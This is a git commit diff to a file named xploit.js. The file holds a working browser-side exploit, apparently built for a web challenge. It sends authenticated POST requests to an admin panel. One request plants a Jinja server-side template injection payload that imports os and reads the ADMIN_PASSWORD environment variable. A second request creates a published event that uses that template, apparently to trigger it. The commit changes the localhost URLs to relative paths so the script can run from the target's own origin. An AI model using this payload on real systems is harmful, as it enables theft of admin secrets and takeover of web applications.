8021c2ae8f218cdf0fc404026de9cb3020a4da7c
DAVID9SE <pupukaka9@gmail.com>
2026-04-23 09:26:08 +0000

    adsd

--- xploit.js
+++ xploit.js
@@ -1,5 +1,5 @@
 console.log("Started xploit")
-let x = fetch("http://localhost:1337/admin/templates/1/edit", {
+let x = fetch("/admin/templates/1/edit", {
   "headers": {
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
     "accept-language": "en-US,en;q=0.9",
@@ -16,8 +16,29 @@ let x = fetch("http://localhost:1337/admin/templates/1/edit", {
     "sec-gpc": "1",
     "upgrade-insecure-requests": "1"
   },
-  "referrer": "http://localhost:1337/admin/templates/1/edit",
   "body": "name=Default+Ticket+Template&html_content=%3Ch1%3E%7B%7B+request.application.__globals__.__builtins__.__import__%28%27os%27%29.environ.get%28%27ADMIN_PASSWORD%27%29+%7D%7D%3C%2Fh1%3E&is_default=on",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
+fetch("/admin/events/create", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    "accept-language": "en-US,en;q=0.9",
+    "cache-control": "no-cache",
+    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryB5p7vggf3FBPQsJG",
+    "pragma": "no-cache",
+    "sec-ch-ua": "\"Brave\";v=\"147\", \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"147\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Linux\"",
+    "sec-fetch-dest": "document",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-user": "?1",
+    "sec-gpc": "1",
+    "upgrade-insecure-requests": "1"
+  },
+  "body": "------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\ntest\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"date\"\r\n\r\n2025-12-12\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"time\"\r\n\r\n12:12\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\naaa\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"location\"\r\n\r\nPrague\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"ticket_price\"\r\n\r\n1\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"total_tickets\"\r\n\r\n100\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"image\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"template_id\"\r\n\r\n1\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"is_published\"\r\n\r\non\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG--\r\n",
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
